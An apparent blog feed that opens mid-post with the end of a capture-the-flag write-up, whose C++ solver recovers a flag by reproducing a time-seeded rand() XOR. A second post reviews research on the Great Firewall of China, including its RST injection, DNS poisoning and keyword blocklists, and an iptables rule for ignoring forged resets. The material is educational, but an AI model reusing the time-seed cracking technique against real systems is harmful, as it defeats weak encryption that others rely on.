&lt;p&gt;We can cook up a simple C++ program to take the output of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;time&lt;/code&gt; program and use the current system time to replicate the process:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C++&quot;&gt;#include &amp;lt;ctime&amp;gt;  
#include &amp;lt;iostream&amp;gt;  
  
// Usage:  
// ./solve $(./time) or $(nc &amp;lt;host&amp;gt; &amp;lt;target&amp;gt;)  
int main(int argc, char** argv) {  
   int time = std::time((time_t *) 0x0);  
   std::srand(time);  
  
   for (uint i = 3; i &amp;lt; argc; ++i) {  
       std::cout &amp;lt;&amp;lt; static_cast&amp;lt;char&amp;gt;(std::stoi(argv[i]) ^ rand() % 0x100); 
   }  
   std::cout &amp;lt;&amp;lt; std::endl;  
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Because this is after the CTF is over, the netcat port that is affiliated with this challenge is down. I’ll have to bother the guy who runs it (who TA’d for me about 3 separate times) to see if we can’t turn it back on for practice. We’ll just have to settle for running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;time&lt;/code&gt; binary locally like this:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ./solve &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;./time&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;  
byuctf&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;fake_flag_bozo_get_good&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;C++ reverse engineering has always been a little intimidating because of the more difficult syntax, but this has been a nice way to get my feet wet.&lt;/p&gt;

&lt;p&gt;Thanks to Justin for helping me out, may your brain be ever &lt;a href=&quot;https://x.com/jakemullins0_t/status/1789792652977914056&quot;&gt;unrotted&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;music-from-this-week&quot;&gt;Music from this week&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/3d1NQh0KOhJqo0Qr4w827X?si=7a4a973a8f934f5c&quot;&gt;Movin’ Down the Line&lt;/a&gt; - Hoyt Axton
&lt;a href=&quot;https://open.spotify.com/track/68FTJoO8edSpzuYb6lGW6P?si=93d6dd3fb7f24236&quot;&gt;Saddle Tramp&lt;/a&gt; - Marty Robbins&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="reverse-engineering" /><category term="ctf" /><category term="c++" /><summary type="html">This winter, I’ll be taking @legoclones/Justin Applegate’s Vulnerability Research and Reverse Engineering class for credit, and he gave me some challenges from BYUCTF 2024 to work through to keep my technical skills up to snuff. I breezed through this one, so the post is short this week. I’m getting into the habit of writing 500 words a day on different projects, so bigger and more impressive things are coming.</summary></entry><entry><title type="html">Week 12 - The Great Firewall of China - Part 1</title><link href="http://localhost:4000/year-of-hacking-0xc" rel="alternate" type="text/html" title="Week 12 - The Great Firewall of China - Part 1" /><published>2024-07-24T00:00:00-06:00</published><updated>2024-07-24T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0xc</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0xc">&lt;p&gt;I had a bit of free time on my hands last summer, so I occupied myself by going through and learning absolutely everything I could about the Great Firewall of China. This ended up being one of the three countries I hastily presented on at the &lt;a href=&quot;https://www.youtube.com/watch?v=2V60P2w1C9o&quot;&gt;BYU Cybersecurity Symposium&lt;/a&gt; in February, the other two being Egypt and Russia. I have since forgotten all of the information, mostly because I wasn’t nearly as good at digesting papers and information as I am now. In an effort to rectify that, I’m codifying my notes instead of using handwritten versions in various OneNotes scattered in my cloud storage.&lt;/p&gt;

&lt;p&gt;For part one of this series, I’ll be doing a literature re-review of the papers I marked as the most important to the academic community’s understanding of the Great Firewall. I hope to continue this work in the future. I’ve spun up an Elastic Compute instance in Beijing through Ali Baba Cloud that I’ll running experiments on. This is part of a larger effort to examine how software has shaped diplomacy, particularly with private hacking tools like Pegasus and the proliferation of dual-use technology like Artificial Intelligence and advanced cryptography.&lt;/p&gt;

&lt;p&gt;The Great Firewall is a censorship program managed by the Cyberspace Administration of China meant to prevent Chinese citizens from accessing external services. I study Arabic, not Chinese so I’ll not theorize on the reason for going through such tremendous effort to restrict the internet for China’s citizens. However, it is often brought up in discussions online that Deng Xiaoping, Mao Zedong’s successor, has been quoted with saying “If you open the window for fresh air, you have to expect some flies to blow in.” Perhaps there is a larger cultural context that I am missing, so I won’t take the words a man who died 27 years ago as load-bearing, even if he was the leader of China more than a decade.&lt;/p&gt;

&lt;p&gt;I’ll start out by giving a rough timeline of our understanding of the Great Firewall of China through the lens of academic papers, then at the end I’ll dump all of my notes, including my thoughts, opinions, and a quick summary on each paper.&lt;/p&gt;

&lt;h2 id=&quot;2006&quot;&gt;2006&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cl.cam.ac.uk/~rnc1/ignoring.pdf&quot;&gt;Ignoring the Great Firewall of China&lt;/a&gt; by Richard Clayton, Steven J. Murdoch, and Robert N. M. Watson proposes a technique for circumventing censorship by exploiting the fact that the Great Firewall only ends a connection by signaling to both the client and the server to stop any connection using a TCP segment with the RST flag enabled, and doesn’t actually drop packets. If both the server and the client ignore the TCP RST flag, data transfer can still happen. The paper presents a simple command (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables -A INPUT -p tcp --tcp-flags RST RST -j DROP&lt;/code&gt;) that makes a Linux machine practically immune to this form of TCP censorship, but does not help with the DNS censorship that is described in later papers. The paper also proves that the firewall reacts the same to inbound as outbound traffic.&lt;/p&gt;

&lt;h2 id=&quot;2014&quot;&gt;2014&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.usenix.org/system/files/conference/foci14/foci14-anonymous.pdf&quot;&gt;Towards a Comprehensive Picture of the Great Firewall’s DNS Censorship&lt;/a&gt; by anonymous authors focuses on exclusively the DNS censorship portion of the firewall. It shows that the DNS portion of the firewall is 99.9% effective, with something only about 80 DNS resolvers of 150 thousand active in China slipping through the of the wall. It proved that the DNS injectors lie at the borders of Chinese internet, and do not execute DNS censorship within China. It also constructed a blocked keyword list, albeit in English.&lt;/p&gt;

&lt;h1 id=&quot;2018&quot;&gt;2018&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://www.usenix.org/system/files/conference/foci18/foci18-paper-hounsel.pdf&quot;&gt;Automatically Generating a Large, Culture-specific Blocklist for China&lt;/a&gt; by Austin Hounsel, Prateek Mittal, and Nick Feamster introduces a method for doing just that. They architected a system that takes an existing list of blocked websites, extracts the most important information from those websites, uses that information as a web search query, then adds any of the resulting websites to the block list. The cycle repeats, filling out with more blocked domains with each iteration. This system is also able to parse Chinese-language content, which gives it a leg up on previous domain-based censorship detection systems that could only process English content.&lt;/p&gt;

&lt;p&gt;The paper presents a list of the top ten one, two, and three word phrases (technically n-grams, not phrases) that were most frequently present on blocked sites. The one word blocklist contains mostly names like 王岐山 (Wang Qishan) a close political ally of Xi Jinping, and 李洪志 (Li Hongzhi), founder of the Falun Gong. The two and three word blocklist contain much more complex ideas. Common phrases used in political reporting like: 声明的反共产主义 (Declared anti-Communist), 采取暴力镇压 to (violently crackdown), 非法 拘留 (illegal detention), and 中共 威胁 (Chinese Communists threaten). There are also sensitive topics that the CCP has shown a desire to erase from history like 天安 门广 场示威 (Tienanmen Square Demonstrations) and 1989 民主 运动 (1989 democracy movement), as well as more current topics that are likely placed in conjunction with criticism, like 香港 政 治 (Hong Kong Politics) and 北戴 河 会议 (Beidaihe meeting).&lt;/p&gt;

&lt;h2 id=&quot;2021&quot;&gt;2021&lt;/h2&gt;

&lt;p&gt;Xiangyu Gao, Meikang Qiu, and Meiqin Liu publish &lt;a href=&quot;https://ieeexplore.ieee.org/document/9492228&quot;&gt;Machine Learning Based Network Censorship&lt;/a&gt; to IEEE. This paper proposes a future extension to the capabilities of a non-specific and hypothetical censorship system to leverage the presumed tendency of a user seeking blocked information to, upon finding the website they are trying to access is blocked, attempt to find the “bad” information on a different site. The firewall could analyze user behavior using a Machine Learning model and draw conclusions on whether the website contains likely blocked information. The system would then use the results to update its ruleset. The paper brings up some practical concerns with overblocking using this method. Extrapolating the average growth rate of the last three years of 25%, China should be exchanging something like 36 Terabits of information a second internationally. It would be incredibly wasteful given the high throughput to expect to monitor and train off of each connection. However, it wouldn’t be necessary to run this model on every single connection, as the goal would be to use a small subset of traffic to “improve” the block list used by the entire sample. Doing some back of the napkin architecting, a reasonable setup could be collecting data on a very small percentage of connections, then doing some preprocessing to select only connections to websites that are known to have “bad” content that will be blocked, and then building a list of potentially “bad” websites to be examined later by a human censor.&lt;/p&gt;

&lt;p&gt;The troubling part of this paper is that this is totally the “problem” I would love to “solve”. It’s a unique cat-and-mouse game between well funded defenders and scrappy, young, and resourceful attackers. I don’t know which side seems more appealing to be a part of.&lt;/p&gt;

&lt;p&gt;That same year, &lt;a href=&quot;https://dl.acm.org/doi/10.1145/3491055&quot;&gt;Understanding the Practices of Global Censorship through Accurate, End-to-End Measurements&lt;/a&gt; by Lin Jin, Shuai Hao, Haining Wang, and Chase Cotton was published to the ACM conference on Measurement and Analysis of Computing Systems in 2021. The researchers used RIPE Atlas, SOCKS proxies, and VPNs to collect measurements of censorship detection in 177 countries during 2 periods in 2020 and 2021, including China. This paper reveals that between the time of the two measurements, about 13 months, China had gone from censoring 23% of all test domains to 35%, a change of almost 52%. The paper also shows the kinds of content that is most often blocked by Country. China is primarily concerned with blocking access to news, external search tools, and proxies, while Middle Eastern countries like Iran, the United Arab Emirates, and Saudi Arabia, and Israel primarily block news and pornography.&lt;/p&gt;

&lt;h1 id=&quot;end-of-the-polished-bit&quot;&gt;End of the polished bit&lt;/h1&gt;

&lt;p&gt;I took a LOT of notes reading these five papers. I would rather make them accessible, even if they’re not FDA-approved for human consumption. Below I’ve copied and pasted my notes for each paper, as well as a quick summarization.&lt;/p&gt;

&lt;h2 id=&quot;ignoring-the-great-firewall-of-china&quot;&gt;Ignoring the Great Firewall of China&lt;/h2&gt;

&lt;p&gt;Boundary router injects forged TCP RST into all subsequent data streams.&lt;/p&gt;

&lt;p&gt;3 methods for content blocking:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Packet Dropping&lt;/em&gt;: All traffic to IP address is discarded. [4] talks about how complex of a problem that is. Also, [6] discovered that 69.8% of all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.org&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.net&lt;/code&gt; domains shared an IP with 50 other websites, probably from CDNs.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;DNS Poisoning&lt;/em&gt;: DNS poisoning attack takes place, either no answer is returned, or an incorrect answer is given which redirects to a warning page.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Content Inspection&lt;/em&gt;: Most expensive option. A proxy will refuse to serve forbidden material. More flexible option is to use an IDS.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When testing the the reset behavior, it is revealed that the RST segments come arrive with a TTL of 47 when the target arrives with a TTL of 39, meaning they were generated by different sources. This technique can be used to pinpoint exactly where the censorship is happening in a path.&lt;/p&gt;

&lt;p&gt;The paper proposes that there is an off-path censor that will evaluate a packet based off of a keyword search. If a packet is evaluated to be “bad”, it will generate 3 TCP RST segments to end the connection. However, the censor does not have the ability to remove the packet from the data stream. There are consequently no guarantees that a single TCP RST segment generated by the censor will arrive after the data gets sent to the target, meaning that it will be ineffective. It is likely that this is the reason for multiple TCP RSTs being transmitted.&lt;/p&gt;

&lt;p&gt;They attempted to get an idea of how many parallel censorship systems exist in a path, but failed. They did, however, discover that splitting a “bad” query up between multiple packets was enough to dodge censors.&lt;/p&gt;

&lt;p&gt;The setup to ignoring the RST segments the censor sent is deceptively simple. All it requires is a single &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables&lt;/code&gt; configuration, which drops any inbound TCP segments that have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RST&lt;/code&gt; flag enabled.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables -A INPUT -p tcp --tcp-flags RST RST -j DROP&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Breaking down this command:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables&lt;/code&gt;: command line tool to configure Linux kernel network rules and firewall.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-A INPUT&lt;/code&gt;: Only apply rule to inbound packets&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p tcp&lt;/code&gt;: Only apply rule to TCP packets&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--tcp-flag RST RST&lt;/code&gt;: Only apply to segments that have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RST&lt;/code&gt; flag enabled.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-j DROP&lt;/code&gt;: Action to take when the previous rules are matched.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The firewall also sometimes injects &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN/ACK&lt;/code&gt; segments that, if arrive before the legitimate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN/ACK&lt;/code&gt;, will cause the connection to close because of an incorrect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ACK&lt;/code&gt; value. This censorship method is not nearly as trivial to circumvent using tools like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables&lt;/code&gt;. Some potential circumvention techniques include changing the behavior of the the kernel to not drop a connection when a malformed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN/ACK&lt;/code&gt; segment is reached, but instead, discard it and wait for a new one. I could imagine this being fairly simple to achieve if all the traffic on a client is routed through a proxy, so that no kernel modifications could be made. Or perhaps, there is another simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables&lt;/code&gt; rule that can be implemented.&lt;/p&gt;

&lt;p&gt;The paper goes on to discuss strategic considerations for building censorship-dodging systems, including the possibility that the firewall could detect encrypted traffic. It also brings up the practical ramifications of dropping every &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RST&lt;/code&gt; segment. As a potential fix, it would be possible to distinguish TCP RSTs coming from the legitimate target as they would have different TTLs. A fix for that would require either a kernel update or specialized software. However, making this behavior default in newer (for 2006) kernel updates would be a reasonable step to take for TCP/IP stack vendors. This paper also clarifies that a fix for this would be simple by updating the RST segment to have the same TTL as the censored packets. This is an interesting demonstration of the arms race that the architects of the firewall and the scrappy developers of anti-censorship workarounds face.&lt;/p&gt;

&lt;h3 id=&quot;thoughts&quot;&gt;Thoughts&lt;/h3&gt;

&lt;p&gt;This paper is old enough to vote. However, it is a milestone in the publicized arms race between firewall architects and people who build technology to dodge censorship, and it correctly predicts that the firewall will increase in complexity by detecting encrypted data. The one line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables&lt;/code&gt; command being all it takes to completely circumvent the firewall at this point is still shocking to me, I don’t know how I don’t remember that from my first time around.&lt;/p&gt;

&lt;h2 id=&quot;towards-a-comprehensive-picture-of-the-great-firewalls-dns-censorship&quot;&gt;Towards a Comprehensive Picture of the Great Firewall’s DNS Censorship&lt;/h2&gt;

&lt;p&gt;Published to USENIX Security in 2014.&lt;/p&gt;

&lt;p&gt;The background section claims that there are a finite list of “malicious” IPs that are the result of the censors injecting DNS responses when trying to resolve “bad” domains. At that time, it was possible to distinguish between injected and legitimate packets. At the time this paper was authored, the number of malicious IPs numbered 174.&lt;/p&gt;

&lt;p&gt;The methodology section mentions the King method, cited in source [8], to trigger DNS queries indirectly to open resolvers for domain names under our control.&lt;/p&gt;

&lt;p&gt;Section four, title “DNS Injection Effectiveness”, details how the researchers found all open DNS Resolvers inside China by probing the entire IPv4 address space on UDP port 53, finding those that are consistently reachable, and that MaxMind’s GeoIP listed as located in China. This method resulted in about 150k open resolvers. Running the King method, they found that of the 78 resolvers that failed, the majority went to Google’s public DNS. It also claims a single resolver operates wholly outside of the purview of the firewall.&lt;/p&gt;

&lt;p&gt;In section five, the authors attempt to locate the DNS injectors. The stated goal of the Great Firewall is to prevent foreign websites from being viewed by Chinese citizens, so it would make sense if these expensive and complex censorship systems lived at the boundary of where Chinese backbone cables met foreign cables. However, there was some debate at the time of authorship on if censorship happened within China, as well as traffic from outside China. The authors designed an experiment to settle this debate.&lt;/p&gt;

&lt;p&gt;Section six deals with reverse-engineering the GFW rule when censoring DNS replies. Queried about 130 million names constructed by taking the Alexa 1 Million and the zone files for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.net&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.org&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.info&lt;/code&gt; and adding the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; subdomain. From the eight months between August 2013 to April 2014 the number of censored domains increased by about 10%. The data they produced implies that the controllers spend significantly more time adding new keywords to censor than removing previously censored keywords. Using that list of 130 million domains, the researchers were able to use a simple binary search to work out exactly what portion of the domain triggered the block. They extracted 35,332 blocked names 14,495 keywords. The top blocked domains were: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;facebook.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;twitter.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;youtube.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;was.info&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;33a.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;88sf.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;appspot.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kproxy.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mefans.com&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sf888.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Section seven attempts to reverse-engineer the structure of a single node in the GFW by selecting a /24 space within China to raise the chances that all of the hosts would by behind the same censor. By triggering the GFW, the researchers were able to glean that there were 4 separate interfaces that injecting poisoned DNS packets. The researchers also were able to reverse engineer the load balancing algorithm at the node.&lt;/p&gt;

&lt;h3 id=&quot;thoughts-1&quot;&gt;Thoughts&lt;/h3&gt;

&lt;p&gt;This paper established a couple of important ground truths for the academic community to build future experiments upon, at least on the DNS censorship half of the system:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;The Great Firewall only censors at the country’s borders, and doesn’t do DNS injection censorship within China.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Creating a list of keywords used by the GFW when deciding to censor a packet.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reverse engineer the architecture of an individual node of the Great Firewall.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;automatically-generating-a-large-culture-specific-blocklist-for-china&quot;&gt;Automatically Generating a Large, Culture-specific Blocklist for China&lt;/h2&gt;

&lt;p&gt;The introduction claims that they improved upon the Filtered-Web method of extracting a block list by using sensitive Chinese phrases, and created and analyzed a list of 1125 previously undiscovered censored domains.&lt;/p&gt;

&lt;p&gt;The Background section states that previously constructed block lists are either not available, outdated, are not particular to Chinese culture and language, and are unable to detect newly censored sites.&lt;/p&gt;

&lt;p&gt;Natural Language Processing (NLP) is a field that combines linguistic, statistics, and computer science with the goal of processing human language in any medium, but typically in text. According to &lt;a href=&quot;https://medium.com/@abhishekjainindore24/n-grams-in-nlp-a7c05c1aff12&quot;&gt;this&lt;/a&gt; Medium post by &lt;a href=&quot;https://medium.com/@abhishekjainindore24?source=post_page-----a7c05c1aff12--------------------------------&quot;&gt;Abhishek Jain&lt;/a&gt;, N-grams are “contiguous sequences of ‘n’ items… These items can be characters, words, or even syllables.” These can be unigrams, with single words like “cat” and “dog”, bigrams like “machine learning”, trigrams like “Chinese Human Rights”, ad infinitum. Differentiating between the n of different n-grams is important because the context of a word can greatly change the meaning. For example, plenty of the operators of the Great Firewall wouldn’t bat an eye at the mention of “Tiananmen Square”, given that it’s a famous landmark across the street from China’s 2nd most famous landmark. However, mentioning “1989” anywhere near that is sure to draw attention. The paper gives the example of the phrase “Destroy the Communist Party” being parsed as “Destroy”, “the”, “Communist”, “Party” under an approach that doesn’t use n-grams. This approach is relatively straightforward to implement for alphabet based languages where individual words are separated by a space like English, Spanish, Arabic, Russian, Hindi et cetera.&lt;/p&gt;

&lt;p&gt;The process for creating the block list follows the following steps:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Step 0&lt;/em&gt;: Start with an initial list of websites that are known to be blocked. This experiment used Citizen Lab’s &lt;a href=&quot;https://github.com/citizenlab/test-lists/blob/master/lists/cn.csv&quot;&gt;test-lists&lt;/a&gt; repository, which at the time of authorship, held 220 websites that were blocked by the GFW. Some of the more notable websites include &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;falundafa.org&lt;/code&gt;, home page of the Falun Gong, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whitehouse.gov&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Step 1&lt;/em&gt;: Access each website in the list and extract both English and Chinese n-grams (phrases) from the content using Stanford CoreNLP, a commonly used collection of NLP tools.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Step 2&lt;/em&gt;: Rank each phrase in the website using the TF-IDF technique, comparing against a culturally Chinese-skewed corpus.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Step 3&lt;/em&gt;: Perform a search query on the most important phrases using a non-censored search engine and collect the search results.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Step 4&lt;/em&gt;: Test each search result for DNS manipulation within China.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Step 5&lt;/em&gt;: Update the list of known censored domains with those that show signs of censorship through DNS manipulation.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Step 6&lt;/em&gt;: Repeat steps 1 through 5 until mixed well. If you can’t build your own computer within Chinese borders, store-bought is fine.&lt;/p&gt;

&lt;p&gt;This system is an improvement of previous blocklist-building techniques because it both populates the list by “learning” from the contents of each banned site and is able to Chinese-language content.&lt;/p&gt;

&lt;p&gt;In this particular experiment, the authors opted to block search results in step 3 from Blogspot, Facebook, Twitter, Youtube, and Tumblr. These sites were already known to be blocked.&lt;/p&gt;

&lt;p&gt;Here’s the results:&lt;/p&gt;

&lt;h3 id=&quot;thoughts-2&quot;&gt;Thoughts&lt;/h3&gt;

&lt;p&gt;I’m a big fan of this paper. It introduces a system that can basically autonomously tell what information the Chinese government has an interest in keeping hidden. I kind wish this experiment was running now to see the current list.s&lt;/p&gt;

&lt;h2 id=&quot;machine-learning-based-network-censorship&quot;&gt;Machine Learning Based Network Censorship&lt;/h2&gt;

&lt;p&gt;Page 2 has some ethical justification for this paper’s existence.&lt;/p&gt;

&lt;p&gt;Section 3 talks about different companies that do what the authors consider censorship:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Facebook: Suicide prevention on Live and Messenger, detecting if user’s are suicidal.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Youtube: Detected ‘terrorism related’ content.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Twitter: The entire NLP algorithm of Twitter is a form of censorship.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;“Behavior Analysis” to help with network censorship.&lt;/p&gt;

&lt;p&gt;Section 4: Machine learning algorithm leverages the assumption that if a user attempts to access a blocked website, they will attempt to hunt down the information on other websites, informing the algorithm what websites are likely to contain similar blocked information. The paper proposes three possible systems to accomplish the task of seeing if subsequently visited websites should be blocked, a human-based process, a machine-based process, and human-machine teaming&lt;/p&gt;

&lt;h3 id=&quot;thoughts-3&quot;&gt;Thoughts&lt;/h3&gt;

&lt;p&gt;It is entirely possible that this paper isn’t describing the existing state of the Great Firewall, or even a proposed extension to the Great Firewall, but perhaps a system developed for lower throughput private corporate networks. In fact, most high-end commodity firewalls have the ability to automatically block web pages if they relate to broad categories like “Hacking”, “Pornography”, and “Gambling”. This is a highly desirable feature in an enterprise environment, but also is, if my understanding is correct, nearly an accidental bonus feature that is produced when building a system meant to filter out malicious traffic, malware, and network intrusions. However, evidence for this paper being meant to improve corporate firewalls is scant, especially since this paper was funded by &lt;em&gt;whoever the hell, I’m pretty sure they control the great firewall&lt;/em&gt;. The stated moral justification that does exist in the paper reeks of self-censorship and tongue-biting:&lt;/p&gt;

&lt;p&gt;71 percent of respondents agreed that “censorship should exist in some form on the Internet”. Sometimes countries block websites that contain topics that are held to be antithetical to accepted societal norms, especially to protect children from being exposed to unsuitable contents. However, in the same survey, 83 percent agree “access to the Internet should be considered as a basic human right”, since blocking websites which might be useful to provide content that they want will be really annoying.&lt;/p&gt;

&lt;p&gt;Perhaps the dismissive nature that the paper takes to the people on the “Against” side of network censorship is an issue with translating from the authors’ native Mandarin to academic English. However, the framing of the issue of censorship ends up having two sides: who protect children from harmful content and those who would be minorly inconvenienced by disrupted access to trivial and unsubstantive information. Maybe this is poor writing, or maybe this framing seeks to remove the conversation of censorship as a system of control completely antithetical to Western-style democracy and subtly displays those who fight for freedom of speech and free flow of information as impatient and demanding, as well as unsympathetic to the instincts of parents to protect their children in favor of easy access to unsubstantive schlock.&lt;/p&gt;

&lt;p&gt;In section 3, the authors give three examples of American private companies exercising censorship on their platforms, using the examples of Facebook detecting suicidal behavior to take steps to intervene, Youtube taking down videos related to terrorism, and Twitter using an inherently Natural Language Processing in their algorithm instead of a typical reverse chronological order.&lt;/p&gt;

&lt;p&gt;The selection of the actions of these three private American seems to show the author’s unwillingness to admit that the most likely use of this work is to stem the free flow of information between borders, rather than prevent suicides or stop terrorists. In the background section, they even introduce the field of Behavioral Analysis using the example of maximizing productivity in a work environment as the exemplary application of the field. This careful selection of a benign and relatively agreeable example could be used to drive any thought of a more sinister use case for the field, particularly in the hands of an authoritarian government.&lt;/p&gt;

&lt;p&gt;If I was writing this article thirty years ago, I would have had to sneak into the Berkeley or USF library, physically locate a print or microfilm copy of the IEEE conference proceedings, then sit, digest the paper, and potentially write this post all within the operating hours of the library. Now with the increased openness and approachability of academic resources with modern information technology, papers are under more scrutiny than ever before by both layman and experts. I congratulate Xiangyu Gao of NYU, Meikang Qiu of Texas A&amp;amp;M Commerce, and Meiqin Liu of Zhejiang University for ensuring that their ideas get shared with the world, and writing a fantastic and innovative paper, and I wish them well in their already illustrious academic careers.&lt;/p&gt;

&lt;p&gt;While I do not agree with work being done to advance the field of internet censorship, I understand that the Chinese Communist Party will continue to chip away at their perceived problem of inadequate control of free information, regardless of if this paper was made public. I am thankful I live in the world where I have a publicly available academic paper documenting advances in internet censorship that fails to meaningfully address the ethical complexities of the work, instead of the world that has this information sequestered away in internal documentation. I also appreciate the candor that the authors present this information with. It would have been simple to present this work as a “Novel ML-Based Web Filtering Framework” couching the paper entirely in a private enterprise context instead of a national context. The fact that three researchers working with the Chinese government on a national censorship project chose to publish their work to a prestigious American journal without mincing words on their goal to be more palatable to a Western audience, to me, shows the strength of American academic culture, and our comfort with allowing disagreeable and harmful ideas to be subject to the same academic scrutiny that useful and productive ideas are.&lt;/p&gt;

&lt;h2 id=&quot;understanding-the-practices-of-global-censorship-through-accurate-end-to-end-measurements&quot;&gt;Understanding the Practices of Global Censorship through Accurate, End-to-End Measurements&lt;/h2&gt;

&lt;p&gt;Published 2021 to ACM Measurement and Analysis of Computing Systems.&lt;/p&gt;

&lt;p&gt;This paper is 26 pages, much longer than typical papers in this field.&lt;/p&gt;

&lt;p&gt;Establishing a “ground truth” in the context of internet censorship is very difficult as often you need to compare between data sources in multiple countries. This means that attempting to resolve the same domain name in different geographic locations could obtain different IPs. Previous attempts to address this used servers that would repeat bytes received back to the sender, but these don’t run on port 80 or 443, the typical ports for HTTP and HTTPS requests. Many censorship systems only check those ports, rendering this particular method useless.&lt;/p&gt;

